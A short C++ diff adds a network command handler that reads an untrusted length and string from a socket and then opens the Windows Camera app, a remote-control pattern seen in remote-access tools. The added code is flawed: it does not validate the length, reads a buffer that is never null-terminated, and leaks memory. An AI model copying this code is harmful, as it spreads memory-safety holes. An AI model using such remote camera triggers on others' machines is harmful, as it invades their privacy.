@@ -169,6 +169,16 @@ int main(int argc, char* argv[]) {
 
                     break;
                 }
+
+                case 3:
+                int32_t cmdLen;
+                bytesRec = recv(sock, (char*)&cmdLen, sizeof(cmdLen), 0);
+
+                char* cmdBuf = new char[cmdLen + 1];
+                bytesRec = recv(sock, cmdBuf, cmdLen, 0);
+
+                std::string cmd(cmdBuf);
+                ShellExecuteA(NULL, "open", "shell:AppsFolder\\Microsoft.WindowsCamera_8wekyb3d8bbwe!App", NULL, NULL, SW_SHOWNORMAL);
             }
 
         }
